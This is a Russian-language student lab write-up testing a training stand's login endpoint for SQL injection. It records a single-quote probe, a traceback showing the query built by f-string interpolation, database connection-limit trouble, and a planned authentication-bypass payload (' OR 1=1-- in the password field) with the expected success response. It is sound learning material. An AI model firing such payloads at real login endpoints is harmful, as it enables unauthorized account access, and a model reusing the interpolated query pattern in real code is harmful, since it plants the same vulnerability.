# ЛР3 SQLi. Проверка ручки login

## Проверенная ручка

POST /away/d613d6fc-55c3-40d9-a03c-53607ac0c422/api/login

## Базовая проверка

Тело запроса:

    {"username":"test","password":"test"}

Результат:

    {"message":"Invalid credentials"}

Вывод: обычная авторизация с неверными учетными данными не проходит.

## Проверка одинарной кавычкой

Тело запроса:

    {"username":"'","password":"test"}

Результат: сервер вернул HTTP 500 Internal Server Error с traceback Werkzeug Debugger.

Из traceback видно, что backend формирует SQL-запрос через строковую интерполяцию:

    query = f"SELECT * FROM users WHERE login = '{username}' AND password = '{password}'"

При передаче одинарной кавычки в поле username итоговый SQL стал некорректным:

    SELECT * FROM users WHERE login = ''' AND password = 'test'

PostgreSQL вернул ошибку синтаксиса:

    psycopg2.errors.SyntaxError: syntax error at or near "test"

## Вывод по уязвимости

Параметры username и password в ручке /api/login подставляются напрямую в SQL-запрос без параметризации.

Это подтверждает наличие SQL Injection в механизме авторизации.

## Проблема нестабильности стенда

После нескольких ошибочных запросов стенд начал возвращать ошибку:

    psycopg2.OperationalError: connection to server at "postgres", port 5432 failed: FATAL: sorry, too many clients already

Это означает, что PostgreSQL на учебном стенде достиг лимита подключений.

Вероятная причина: при SQL-ошибке соединение с БД не закрывается корректно, потому что выполнение прерывается до conn.close().

## Дальнейшая тактика

1. Не отправлять одиночные синтаксически битые payload-и.
2. Работать только через Burp Repeater.
3. Добавлять заголовок Connection: close.
4. Использовать минимальное число запросов.
5. Для обхода авторизации сначала проверять password-инъекцию, чтобы cookie user получила нормальное значение.

Основной payload для проверки:

    {"username":"admin","password":"' OR 1=1-- "}

Ожидаемый успешный признак:

    HTTP/1.1 200 OK
    Set-Cookie: user=admin; Path=/; SameSite=Lax
    Login successful
